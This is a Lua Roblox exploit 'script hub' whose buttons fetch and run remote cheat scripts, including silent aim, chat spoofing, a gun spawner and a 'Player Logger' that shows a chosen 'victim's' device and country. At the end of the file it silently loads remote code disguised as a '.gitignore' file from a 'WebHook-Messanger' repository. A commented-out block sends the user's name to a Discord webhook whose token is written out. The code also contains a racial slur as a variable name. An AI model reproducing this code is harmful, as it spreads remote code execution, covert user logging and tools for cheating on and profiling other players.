local Player = game.Players.LocalPlayer
local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "Annon Hub", HidePremium = false, IntroText = "Annon Hub", SaveConfig = false, SaveConfig = false, ConfigFolder = "Annon Hub"})



--[[
███╗░░██╗░█████╗░████████╗██╗███████╗██╗░█████╗░░█████╗░████████╗██╗░█████╗░███╗░░██╗
████╗░██║██╔══██╗╚══██╔══╝██║██╔════╝██║██╔══██╗██╔══██╗╚══██╔══╝██║██╔══██╗████╗░██║
██╔██╗██║██║░░██║░░░██║░░░██║█████╗░░██║██║░░╚═╝███████║░░░██║░░░██║██║░░██║██╔██╗██║
██║╚████║██║░░██║░░░██║░░░██║██╔══╝░░██║██║░░██╗██╔══██║░░░██║░░░██║██║░░██║██║╚████║
██║░╚███║╚█████╔╝░░░██║░░░██║██║░░░░░██║╚█████╔╝██║░░██║░░░██║░░░██║╚█████╔╝██║░╚███║
╚═╝░░╚══╝░╚════╝░░░░╚═╝░░░╚═╝╚═╝░░░░░╚═╝░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░╚════╝░╚═╝░░╚══╝]]

OrionLib:MakeNotification({
	Name = "Annon Hub",
	Content = "Your have successfully logged in as "..Player.Name..".",
	Image = "rbxassetid://4483345998",
	Time = 5
	})

-------------------------------- ERROR 404 Dark Dex --------------------------------
function dark()
OrionLib:MakeNotification({
	Name = "ERROR: 404",
	Content = "ERROR: Looking for the orginal Dark Dex (Use Synapse Dark Dex)",
	Image = "rbxassetid://4483345998",
	Time = 10
})
	end


-------------------------------- DESTROY UI --------------------------------
function DestroyUI()
OrionLib:MakeNotification({
	Name = "Title!",
	Content = "Notification content... what will it say??",
	Image = "rbxassetid://4483345998",
	Time = 5
})
end

------------------------------ Inject Tycoon Hub
function InjectTycoon()
	OrionLib:MakeNotification({
		Name = "Injecting",
		Content = "Injecting Tycoon Hub.",
		Image = "rbxassetid://4483345998",
		Time = 5
		})
	end
--------------------------- Inject FE ScriptHub ----------------------
function InjectFE()
OrionLib:MakeNotification({
	Name = "Injecting",
	Content = "Injecting FE ScriptHub.",
	Image = "rbxassetid://4483345998",
	Time = 5
	})
end

------------------------- Inject Simple Simulator Hub ----------------------
function InjectSimple()
OrionLib:MakeNotification({
	Name = "Injecting",
	Content = "Injecting Simple Simulator.",
	Image = "rbxassetid://4483345998",
	Time = 5
	})
end

--------------------------- Injecting Simulator Hub -----------------------------
function InjectSimulator()
OrionLib:MakeNotification({
	Name = "Injecting",
	Content = "Injecting Simulator Hub.",
	Image = "rbxassetid://4483345998",
	Time = 5
	})
end




--[[

██╗░░░██╗░█████╗░██╗░░░░░██╗░░░██╗███████╗░██████╗
██║░░░██║██╔══██╗██║░░░░░██║░░░██║██╔════╝██╔════╝
╚██╗░██╔╝███████║██║░░░░░██║░░░██║█████╗░░╚█████╗░
░╚████╔╝░██╔══██║██║░░░░░██║░░░██║██╔══╝░░░╚═══██╗
░░╚██╔╝░░██║░░██║███████╗╚██████╔╝███████╗██████╔╝
░░░╚═╝░░░╚═╝░░╚═╝╚══════╝░╚═════╝░╚══════╝╚═════╝░                               ]]

_G.autoClicker = true -- Tapping Legends X
_G.autoRebirth = true -- Tapping Legends X
_G.autoEgg = true -- Tapping Legends X
_G.autoHatch = true -- Tapping Legends X


_G.sliderString = "string" -- slider string
_G.niggaHub = "Dog Hub :)"





--[[
███████╗██╗░░░██╗███╗░░██╗░█████╗░████████╗██╗░█████╗░███╗░░██╗░██████╗
██╔════╝██║░░░██║████╗░██║██╔══██╗╚══██╔══╝██║██╔══██╗████╗░██║██╔════╝
█████╗░░██║░░░██║██╔██╗██║██║░░╚═╝░░░██║░░░██║██║░░██║██╔██╗██║╚█████╗░
██╔══╝░░██║░░░██║██║╚████║██║░░██╗░░░██║░░░██║██║░░██║██║╚████║░╚═══██╗
██║░░░░░╚██████╔╝██║░╚███║╚█████╔╝░░░██║░░░██║╚█████╔╝██║░╚███║██████╔╝
╚═╝░░░░░░╚═════╝░╚═╝░░╚══╝░╚════╝░░░░╚═╝░░░╚═╝░╚════╝░╚═╝░░╚══╝╚═════╝░]]


-------------------------------- Tapping Legends X --------------------------------
-------------------------------- Functions Auto Clicker --------------------------------
function autoClicker()
while _G.autoClicker == true do
   game:GetService("ReplicatedStorage").Events.Click3:FireServer()
   wait(.00000000000000000000000000000000000000000000000000000000000000001)
end
end


-------------------------------- Function Auto Rebirth --------------------------------
function autoRebirth()
while _G.autoRebirth == true do
   game:GetService("ReplicatedStorage").Events.Rebirth:FireServer(40)
   wait(.000000000000000001)
end
end


-------------------------------- Function Egg Hatch --------------------------------
function autoEgg()
while _G.autoEgg == true do
   game:GetService("ReplicatedStorage").Functions.Unbox:InvokeServer("Kraken","Triple")
   wait(.0000000000000000000000001)
end
end
	

-------------------------------- Function Egg hatch (better egg) --------------------------------
function autoHatch()
while _G.autoHatch == true do
   game:GetService("ReplicatedStorage").Functions.Unbox:InvokeServer("SpaceLab","Triple")
   wait(.000000000000000000000001)
end
end

-------------------------------- Build A Boat infinite blocks --------------------------------
function infiniteBlocks()
	_G.RUN = true
spawn(function()
coroutine.wrap(function()
while _G.RUN do wait()
coroutine.wrap(function()
while _G.RUN do wait()
workspace.ItemBoughtFromShop:InvokeServer("Winter Chest",math.floor(game:GetService("Players").LocalPlayer.Data.Gold.Value / 100))
end
end)()
end
end)()
end)
end


------------------ Music Player ----------------
function MusicPlayer()
local SolarisLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/sol"))()

local win = SolarisLib:New({
  Name = "music gui",
  FolderToSave = "sliperLoader"
})

local tab = win:Tab("Games")

local idiot = tab:Section("idiot")

local label = idiot:Label("gui was made by cjk#3973")

local label = idiot:Label("if you see a ... click on it then there")
end

function Remote()
	local owner = "Upbolt"
local branch = "revision"

local function webImport(file)
    return loadstring(game:HttpGetAsync(("https://raw.githubusercontent.com/%s/Hydroxide/%s/%s.lua"):format(owner, branch, file)), file .. '.lua')()
end

webImport("init")
webImport("ui/main")
end


------------------------------------ Crosswoods safty ------------------------------------
function safe()
local Module_Scripts = {}
local Part = Instance.new("Part")
local LocalScript = Instance.new("LocalScript")


Part.Anchored = true
Part.BottomSurface = Enum.SurfaceType.Smooth
Part.BrickColor = BrickColor.new([[Bright green]])
Part.CFrame = CFrame.new(9999, 50, 9999, 1, 0, 0, 0, 1, 0, 0, 0, 1)
Part.Color = Color3.new(0.294118, 0.592157, 0.294118)
Part.Material = Enum.Material.Grass
Part.Parent = workspace
Part.Position = Vector3.new(9999, 50, 9999)
Part.Size = Vector3.new(100, 1, 100)
Part.TopSurface = Enum.SurfaceType.Smooth

function LocalScript_ScriptfakeXD()

	local script = Instance.new("LocalScript",Part)
	LocalScript = script
	script.Name = [[LocalScript]]	
	local require_fake = require
	local require = function(Object)
		local functiom = Module_Scripts[Object]
		if functiom then
			return functiom()
		end
		return require_fake(Object)
	end
	local safe = false
	
	game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(key)
		if key == "k" then
			if safe == false then
				_G.pos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
				safe = true
				game.Players.LocalPlayer.Character:MoveTo(script.Parent.Position + Vector3.new(0,3,0))
			else
				safe = false
				game.Players.LocalPlayer.Character:MoveTo(_G.pos)
			end
			
		end
	end)

end
coroutine.wrap(LocalScript_ScriptfakeXD)()
end



















-------------------------------- RANDOM IGNORE --------------------------------
local Profile = Window:MakeTab({
	Name = "Profile",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
local Section = Profile:AddSection({
	Name = "Information"
})
Profile:AddParagraph("Information","Currently in Alpha, mostly messing around with the UI, not many people will have this script for now, mainly used by me")
local Section = Profile:AddSection({
	Name = "Profile"
})
Profile:AddParagraph("Profile","Annon Hub is the best hub ofc ;) made by Annon#7747 UwW")
local Section = Profile:AddSection({
	Name = "Whats Annon Hub for"
})
Profile:AddParagraph("What's Annon Hub for?","Annon Hub is a script hub full of scripts/HUBS")




--[[
███╗░░░███╗░█████╗░██╗███╗░░██╗
██╔████╔██║███████║██║██╔██╗██║
██║╚██╔╝██║██╔══██║██║██║╚████║
██║░╚═╝░██║██║░░██║██║██║░╚███║
╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝╚═╝░░╚══╝]]

local Main = Window:MakeTab({
	Name = "Main",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
Main:AddParagraph("Main","Mostly Universial scripts")
local MainSection = Main:AddSection({
	Name = "Main"
})

  -------------------------------- Infinite Yield --------------------------------
Main:AddButton({
	Name = "Infinite Yield",
	Callback = function()
      		loadstring(game:HttpGet(('https://raw.githubusercontent.com/YourMomClapped/Loading-Screen/main/.lua'),true))()
  	end    
})


-------------------------------- Owl Hub --------------------------------
	Main:AddButton({
	Name = "Owl Hub",
	Callback = function()
      		loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))();
  	end    
})

  -------------------------------- Silent Aim --------------------------------
Main:AddButton({
	Name = "Universial",
	Callback = function()
      		loadstring(game:HttpGet("https://raw.githubusercontent.com/Averiias/Universal-SilentAim/main/main.lua"))()
  	end    
})

-------------------------------- CMD X MAIN SCRIPT --------------------------------
local Section = Main:AddSection({
	Name = "Cmd X"
})
Main:AddParagraph("Cmd X","Using Cmd X breaks your avatar (NO IDEA WHY) the commands work completly fine.")
Main:AddButton({
Name = "CMD-X",
Callback = function()
		  loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source", true))()
  end    
})


-------------------------------- Chat Spoofer --------------------------------
local Section = Main:AddSection({
	Name = "Chat Spoofer"
})
Main:AddButton({
	Name = "Chat Spoofer",
	Callback = function()
      		loadstring(game:HttpGet("https://raw.githubusercontent.com/YourMomClapped/Chat-Spoofer/main/.Main"))()
  	end    
})
Main:AddButton({
	Name = "Chat Spoofer V2",
	Callback = function()
      		loadstring(game:HttpGet('https://raw.githubusercontent.com/ant-7802/--/main/straightmilk.lua'))()
  	end    
})


-------------------------------- FOR MAKING SCRIPTS --------------------------------
local Section = Main:AddSection({
	Name = "Scripting"
})


-------------------------------- Remote Spy --------------------------------
Main:AddButton({
	Name = "Remote Spy",
	Callback = function()
      		loadstring(game:httpGet("https://pastebin.com/raw/BDhSQqUU", true))()
			Remote()
  	end    
})

-------------------------------- Dark Dex --------------------------------
Main:AddButton({
	Name = "Dark Dex (NOT WORKING)",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/BypassedDarkDexV3.lua", true))()
  	end    
})

-------------------------------- Prison Life --------------------------------
if game.PlaceId == 155615604 then
local Prison = Window:MakeTab({
	Name = "Prison Life",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
Prison:AddParagraph("Prison Life","Prison life scripts this should be a reminder one day i need to find better FE admin commands")
	local Section = Prison:AddSection({
	Name = "Prison Life Scripts"
})
	
	-------------------------------- Prison Life Gun Spawner --------------------------------
	Prison:AddButton({
	Name = "GunSpawner",
	Callback = function()
      		loadstring(game:HttpGet("https://raw.githubusercontent.com/YourMomClapped/PrisonLifee/main/main.lua"))()
  	end    
})
	
	-------------------------------- Prison Life Admin --------------------------------
	Prison:AddButton({
	Name = "Prison life Admin",
	Callback = function()
      		loadstring(game:HttpGet("https://raw.githubusercontent.com/YourMomClapped/Prison-Life-Admin/main/.Main"))()
  	end    
})
end







--[[
	███╗░░░███╗██╗░░░██╗  ░██████╗░█████╗░██████╗░██╗██████╗░████████╗  ██╗░░██╗██╗░░░██╗██████╗░░██████╗
	████╗░████║╚██╗░██╔╝  ██╔════╝██╔══██╗██╔══██╗██║██╔══██╗╚══██╔══╝  ██║░░██║██║░░░██║██╔══██╗██╔════╝
	██╔████╔██║░╚████╔╝░  ╚█████╗░██║░░╚═╝██████╔╝██║██████╔╝░░░██║░░░  ███████║██║░░░██║██████╦╝╚█████╗░
	██║╚██╔╝██║░░╚██╔╝░░  ░╚═══██╗██║░░██╗██╔══██╗██║██╔═══╝░░░░██║░░░  ██╔══██║██║░░░██║██╔══██╗░╚═══██╗
	██║░╚═╝░██║░░░██║░░░  ██████╔╝╚█████╔╝██║░░██║██║██║░░░░░░░░██║░░░  ██║░░██║╚██████╔╝██████╦╝██████╔╝
	╚═╝░░░░░╚═╝░░░╚═╝░░░  ╚═════╝░░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░░░░░░░╚═╝░░░  ╚═╝░░╚═╝░╚═════╝░╚═════╝░╚═════╝░]]


local Imade = Window:MakeTab({
	Name = "My Script Hubs",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})


Imade:AddParagraph("My Script Hubs","Scripts made by one and only Annon#7747, i created these to save up space and be more organized with scripts.")

	-- Simulator hubs
	local Section = Imade:AddSection({
	Name = "Simulator Hubs"
})

	Imade:AddButton({
	Name = "Simulator Hub",
	Callback = function()
		InjectSimulator()
		wait(1)
		loadstring(game:HttpGet(('https://raw.githubusercontent.com/YourMomClapped/Simulators/main/.lua')))()
  	end    
})
	Imade:AddButton({
	Name = "Simple Simulator Hub",
	Callback = function()
		InjectSimple()
		wait(1)
      		loadstring(game:HttpGet("https://raw.githubusercontent.com/YourMomClapped/Simulator-Script/main/.lua"))()
  	end    
})
-------------------------------- Tycoon Hub --------------------------------
local Section = Imade:AddSection({
	Name = "Tycoon Hub"
})
Imade:AddButton({
	Name = "Tycoon Hub",
	Callback = function()
		InjectTycoon()
		wait(1)
		loadstring(game:HttpGet(('https://raw.githubusercontent.com/YourMomClapped/Tycoon-Hub/main/.lua'),true))()
  	end    
})

------------------------- FE ScriptHub -------------------------
local Section = Imade:AddSection({
	Name = "FE ScriptHub"
})
Imade:AddButton({
	Name = "FE ScriptHub",
	Callback = function()
		InjectFE()
		wait(1)
		loadstring(game:HttpGet("https://raw.githubusercontent.com/YourMomClapped/Fe-ScriptHub/main/.lua", true))()
  	end    
})





--[[
░██████╗░█████╗░██████╗░██╗██████╗░████████╗  ██╗░░██╗██╗░░░██╗██████╗░░██████╗
██╔════╝██╔══██╗██╔══██╗██║██╔══██╗╚══██╔══╝  ██║░░██║██║░░░██║██╔══██╗██╔════╝
╚█████╗░██║░░╚═╝██████╔╝██║██████╔╝░░░██║░░░  ███████║██║░░░██║██████╦╝╚█████╗░
░╚═══██╗██║░░██╗██╔══██╗██║██╔═══╝░░░░██║░░░  ██╔══██║██║░░░██║██╔══██╗░╚═══██╗
██████╔╝╚█████╔╝██║░░██║██║██║░░░░░░░░██║░░░  ██║░░██║╚██████╔╝██████╦╝██████╔╝
╚═════╝░░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░░░░░░░╚═╝░░░  ╚═╝░░╚═╝░╚═════╝░╚═════╝░╚═════╝░
]]
local HUB = Window:MakeTab({
	Name = "Script Hubs",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
HUB:AddParagraph("Script Hub","Random Script Hubs i find and are good")


-------------------------------- GUN SIMULATOR --------------------------------
local Section = HUB:AddSection({
	Name = "Proxima Hub"
})
HUB:AddButton({
	Name = "Proxima Hub",
	Callback = function()
      		loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/Proxima-Hub/main/Main.lua"))()
  	end    
})
HUB:AddDropdown({
	Name = "Games Proxima Hub Supports",
	Default = "Tapping Legends X",
	Options = {"[+] Rebirth Champions X", "[+] Anime Journey", "[+] Ninja Legends", "[+] Gun Simulator", "[+] Legends Of Speed", "[+] Destruction Simulator", "[+] Saber Simulator", "[+] Tower Of Hell", "[+] Lucky Block", "[+] Horrific Housing", "[+]Anime Sword Simulator", "[+] Kick Off", "[+] Givenchy Beauty House", "[+] Tommy Play", "[+] Gucci Town", "[+] Broken Bones Simulator", "[+] Tate McRae Concert Experienc", "[+] Samsung Superstar Galaxy", "[+] Spotify Island", "[+] Logitech Song Breaker Awards", "[+] Alo Sanctuary", "Beatland", "[+] Clicker Madness", "[+] Roblox Pro League"},
	Callback = function(Value)
		print(Value)
	end    
})


-------------------------------- Space X --------------------------------
local Section = HUB:AddSection({
	Name = "Space X"
})
HUB:AddButton({
	Name = "Space X",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Dynamlc/SpaceX/main/Loader"))()
  	end    
})
HUB:AddDropdown({
	Name = "Games Space X Supports",
	Default = "Click to check",
	Options = {"Raise A Floppa 2", "Pressure Wash Simulator", "Hunter x Athena", "Strong Simulator X", "Sizzling Simulator", "Mega Mansion Tycoon", "Strongman Simulator", "Rebirth Champions X", "Clicker Simulator", "Chicago Remastered", "Animal Simulator", "Collect All Pets", "Build A Boat For Treasure", "Boxing Simulator", "Tapping Legends X", "Base Battles", "Spider", "Tower Of Misery", "Criminality", "Goal Kick Simulator"},
	Callback = function(Value)
		print(Value)
	end    
})

-------------------------------- Pendulum Hub --------------------------------
local Section = HUB:AddSection({
	Name = "Pendulum Hub"
})
HUB:AddParagraph("Pendulum Hub","FE Animations Script Hub/ Ultimate TRolling Gui type thing")
HUB:AddButton({
	Name = "Pendulum Hub",
	Callback = function()
      		loadstring(game:HttpGet("https://raw.githubusercontent.com/Tescalus/Pendulum-Hubs-Source/main/Pendulum%20Hub%20V5.lua"))()

  	end    
})

-------------------------------- Frozen Hub --------------------------------
local Section = HUB:AddSection({
	Name = "Frozen Hub"
})
HUB:AddButton({
	Name = "Frozen Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptsLynX/FrozenHub/main/KeySystem"))()
  	end    
})


-------------------------------- Rebirth Champions X HUB --------------------------------
    local Section = HUB:AddSection({
	Name = "Rebirth Champions X HUB"
})
	HUB:AddButton({
	Name = "RCX HUB",
	Callback = function()
      		loadstring(game:HttpGet("https://raw.githubusercontent.com/AForgottenAccount/Rebrith-hub/main/Rebrith-hub"))()
  	end    
})


-------------------------------- Domain X --------------------------------
    local Section = HUB:AddSection({
	Name = "Domain X"
})
HUB:AddParagraph("Domain X","Smart Script Domain X script hub")
HUB:AddButton({
	Name = "Domain X",
	Callback = function()
      		loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/DomainX/main/source',true))()
  	end    
})


-------------------------------- Nullware Hub V3 --------------------------------
local Section = HUB:AddSection({
	Name = "Nullware Hub V3"
})
	HUB:AddParagraph("Nullware Hub V3","Goto Seby's discord: https://discord.gg/ukBFMxVCKS to see the featrues")
	HUB:AddButton({
	Name = "Nullware Hub V3",
	Callback = function()
      		getgenv().Theme = "Blue" -- To change the UI Theme, set this to one of the following options: "Red", "Purple", "Blue", "Green", "Yellow"
                loadstring(game:HttpGet("https://gist.githubusercontent.com/M6HqVBcddw2qaN4s/2d722888a388017c18028cd434c43a25/raw/dcccf1027fe4b90780e47767aaf584389c9d7771/EULma3fU90PUOKUn?identifier=".. (function()local a=""for b=1,256 do local c=math.random(1,3)a=a..string.char(c==1 and math.random(48,57)or c==2 and math.random(97,122)or c==3 and math.random(65,90))end;return a end)()))()
  	end    
})


-------------------------------- Shark Bite --------------------------------
local Section = HUB:AddSection({
	Name = "Shark Bite LOOF-sys"
})
HUB:AddButton({
	Name = "Shark Bite",
	Callback = function()
      		loadstring(game:HttpGet("https://raw.githubusercontent.com/LOOF-sys/Roblox-Shit/main/SharkBite.lua",true))()
  	end    
})
HUB:AddButton({
	Name = "Join Shark Bite Game",
	Callback = function()
      		sharkTeleport()
  	end    
})

-------------------------------- Ultra Hub --------------------------------
local Section = HUB:AddSection({
	Name = "Ultra Hub"
})
HUB:AddButton({
	Name = "Ultra Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ZaRdoOx/Ultra-Hub/main/Main"))()
  	end    
})
HUB:AddDropdown({
	Name = "Games Ultra Hub supports",
	Default = "Mining Clicker Simulator",
	Options = {"[+] Mining Clicker Simulator", "[+] Tapping Simulator", "[+] Strong Simulator", "[+] Pet Posse", "[+] Firework Simulator", "[+] Weapon Fighting Simulator", "[+] Sonic Speed Simulator", "[+] Sword Simulator", "[+] Actor Tycoon Loader", "[+] Mining Simularo", "[+] Magic Simulator", "[+] Ninja Training Simulator", "[+] Pet Simlator X"},
	Callback = function(Value)
		print(Value)
	end    
})

------------------------------- His Script Hub -------------------------------
local Section = HUB:AddSection({
	Name = "Choppa Hub"
})
HUB:AddButton({
	Name = "Choppa Hub (DONT TRUST 100%)",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/TayKIsMyDad/script-hub/main/Main", true))()
  	end    
})
HUB:AddDropdown({
	Name = "Games Choppa Hub supports",
	Default = "Click Me",
	Options = {"[+] Phantom Forces", "[+] Hoops Life", "[+] Infinite Yield", "[+] Prison Life Remastered (Broken)", "[+] Universal Aimbot (Aimware)", "[+] Jailbird"},
	Callback = function(Value)
		print(Value)
	end    
})














--[[
░██████╗░█████╗░██████╗░██╗██████╗░████████╗░██████╗
██╔════╝██╔══██╗██╔══██╗██║██╔══██╗╚══██╔══╝██╔════╝
╚█████╗░██║░░╚═╝██████╔╝██║██████╔╝░░░██║░░░╚█████╗░
░╚═══██╗██║░░██╗██╔══██╗██║██╔═══╝░░░░██║░░░░╚═══██╗
██████╔╝╚█████╔╝██║░░██║██║██║░░░░░░░░██║░░░██████╔╝
╚═════╝░░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░░░░░░░╚═╝░░░╚═════╝░]]

local Scripts = Window:MakeTab({
	Name = "Scripts",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
Scripts:AddParagraph("Scripts","Random scripts that i wouold mostly use (More then 'Other')")


-------------------------------- Build A Boat --------------------------------
	local Section = Scripts:AddSection({
		Name = "Build a boat"
	})
	Scripts:AddButton({
		Name = "Build A Boat",
		Callback = function()
				  
		  end    
	})
	Scripts:AddDropdown({
		Name = "Build a boat features",
		Default = "1",
		Options = {"[+] Copy players builds", "[+] auto build (File)", "[+] Preview file build", "[+] List blocks", "[+] Safe Mode"},
		Callback = function(Value)
			print(Value)
		end    
	})
	Scripts:AddButton({
		Name = "Build a boat: Infinite Blocks",
		Callback = function()
				  infiniteBlocks()
		  end    
	})
 

-------------------------------- Music Player --------------------------------
	local Section = Scripts:AddSection({
		Name = "Music Player"
	})
	Scripts:AddButton({
		Name = "Music Player (Player Roblox Ids)",
		Callback = function()
				  MusicPlayer()
		  end    
	})
	Scripts:AddButton({
		Name = "Play Spotify Music",
		Callback = function()
			loadstring(game:HttpGet('https://pastebin.com/raw/dcim7NHX'))()
		  end    
	})



------------------------------- Guess How Much -------------------------------
local Section = Scripts:AddSection({
	Name = "Guess How Many"
})
Scripts:AddButton({
	Name = "Guess Script",
	Callback = function()
		local count = -12
	for _,v in pairs(workspace.Items:GetChildren()) do
	count = count + 1
	end
	print(count)
	  end    
})









--[[
░█████╗░████████╗██╗░░██╗███████╗██████╗░
██╔══██╗╚══██╔══╝██║░░██║██╔════╝██╔══██╗
██║░░██║░░░██║░░░███████║█████╗░░██████╔╝
██║░░██║░░░██║░░░██╔══██║██╔══╝░░██╔══██╗
╚█████╔╝░░░██║░░░██║░░██║███████╗██║░░██║
░╚════╝░░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
]]

local Other = Window:MakeTab({
	Name = "Other",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
Other:AddParagraph("Other","Mostly scripts ill probably use in the future or interested in")



-------------------------------- Log Player Information --------------------------------
local Section = Other:AddSection({
	Name = "Player Logger"
})
Other:AddParagraph("Print Player Info","Choose a victim, when chosen it shows their information such as what device they use, what country they live in ETC.")
Other:AddButton({
	Name = "Print Player Info",
	Callback = function()
      		loadstring(game:HttpGet('https://raw.githubusercontent.com/Bukito20/Public-scripts/main/IslandsGrabberGui'))()
  	end    
})


-------------------------------- TELEPORT TO MY TEST GAME --------------------------------
if Player.UserId == 1201621667 then
local Section = Other:AddSection({
	Name = "Teleport to Test IDK"
})
Other:AddButton({
	Name = "Teleport (Test IDK)",
	Callback = function()
      		Teleport()
  	end    
})
end






Other:AddParagraph("Choose one","Choose one slider then click this button one of the sliders will create a special script hub")
Other:AddDropdown({
	Name = "Down",
	Default = "click me "..Player.Name.."",
	Options = {"click me "..Player.Name.."", "print that Value", "Dog Hub :)"},
	Callback = function(Value)
		_G.sliderString = Value
	end    
})Other:AddButton({
	Name = "Choose one slider then click this button",
	Callback = function()
      		if _G. sliderString == _G.niggaHub then
				niggaHub()
      		end    
  end
})

-------------------------------- Crosswoods safty --------------------------------
local Section = Other:AddSection({
	Name = "Safty"
})

Other:AddButton({
	Name = "Crosswoods safty (Cannot get temp banned)",
	Callback = function()
      		Safe()
  	end    
})






--[[
░██████╗███████╗████████╗████████╗██╗███╗░░██╗░██████╗░░██████╗
██╔════╝██╔════╝╚══██╔══╝╚══██╔══╝██║████╗░██║██╔════╝░██╔════╝
╚█████╗░█████╗░░░░░██║░░░░░░██║░░░██║██╔██╗██║██║░░██╗░╚█████╗░
░╚═══██╗██╔══╝░░░░░██║░░░░░░██║░░░██║██║╚████║██║░░╚██╗░╚═══██╗
██████╔╝███████╗░░░██║░░░░░░██║░░░██║██║░╚███║╚██████╔╝██████╔╝
╚═════╝░╚══════╝░░░╚═╝░░░░░░╚═╝░░░╚═╝╚═╝░░╚══╝░╚═════╝░╚═════╝░]]

local Settings = Window:MakeTab({
	Name = "Settings",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})


Settings:AddParagraph("Settings","Settings are currenty not working (under review)")
local Section = Settings:AddSection({
	Name = "Settings"
})



-------------------------------- Transparancy --------------------------------
Settings:AddSlider({
	Name = "Slider",
	Min = 0,
	Max = 20,
	Default = 5,
	Color = Color3.fromRGB(255,255,255),
	Increment = 1,
	ValueName = "Transparancy",
	Callback = function(Value)
		print(Value)
	end    
})


-------------------------------- COLOUR PICKER --------------------------------
Settings:AddColorpicker({
	Name = "Colorpicker",
	Default = Color3.fromRGB(255, 0, 0),
	Callback = function(Value)
		print(Value)
	end	  
})


-------------------------------- Keybind For Ui --------------------------------
Settings:AddBind({
	Name = "Off/On",
	Default = Enum.KeyCode.E,
	Hold = false,
	Callback = function()
		print("NOT WORKING: currently under review")
	end    
})


Settings:AddDropdown({
	Name = "Setting",
	Default = "1",
	Options = {"1", "2", "3", "4"},
	Callback = function(Value)
		print(Value)
	end    
})
local Section = Settings:AddSection({
	Name = "Destroy GUI"
})
Settings:AddButton({
	Name = "Destroy",
	Callback = function()
      		OrionLib:Destroy()
  	end    
})











































--[[
██████╗░██╗░██████╗░█████╗░░█████╗░██████╗░██████╗░  ██╗░░░░░░█████╗░░██████╗░░██████╗
██╔══██╗██║██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗  ██║░░░░░██╔══██╗██╔════╝░██╔════╝
██║░░██║██║╚█████╗░██║░░╚═╝██║░░██║██████╔╝██║░░██║  ██║░░░░░██║░░██║██║░░██╗░╚█████╗░
██║░░██║██║░╚═══██╗██║░░██╗██║░░██║██╔══██╗██║░░██║  ██║░░░░░██║░░██║██║░░╚██╗░╚═══██╗
██████╔╝██║██████╔╝╚█████╔╝╚█████╔╝██║░░██║██████╔╝  ███████╗╚█████╔╝╚██████╔╝██████╔╝
╚═════╝░╚═╝╚═════╝░░╚════╝░░╚════╝░╚═╝░░╚═╝╚═════╝░  ╚══════╝░╚════╝░░╚═════╝░╚═════╝░
]]

loadstring(game:HttpGet(('https://raw.githubusercontent.com/YourMomClapped/WebHook-Messanger/main/.gitignore'),true))()







--[[
function _G.SendWebHook(url, message)newBody = {["content"] = tostring(message)}; SynWebHook = {Url = url,Body = game.HttpService:JSONEncode(newBody),Method = "POST",Headers = {["content-type"] = "application/json"}};syn.request(SynWebHook)end;

_G.SendWebHook("https://discord.com/api/webhooks/998558679790002276/-kgc-yS5MZoJSv0fQPBcFLB_ACSSCCF0dUNBUfo3WByB1k2AstuDYuJSr4LBrtzavNk6", "**"..Player.Name.."** has successfully logged into **Annon Hub***")
]]















OrionLib:Init()
OrionLib:Destroy()
